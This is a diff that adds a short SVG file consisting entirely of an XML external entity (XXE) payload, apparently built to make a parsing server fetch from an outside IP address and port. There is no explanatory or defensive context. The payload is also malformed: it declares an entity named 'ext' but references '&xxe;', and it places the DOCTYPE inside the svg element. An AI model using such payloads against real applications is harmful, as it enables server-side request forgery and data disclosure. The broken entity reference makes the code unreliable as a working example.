@@ -1,0 +1,9 @@
+<svg>
+    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://45.127.133.75:3000" > ]>                                                             
+<message>
+<id></id>
+<message>&xxe;</message>
+<title>xml</title>
+</message>
+</svg>
+
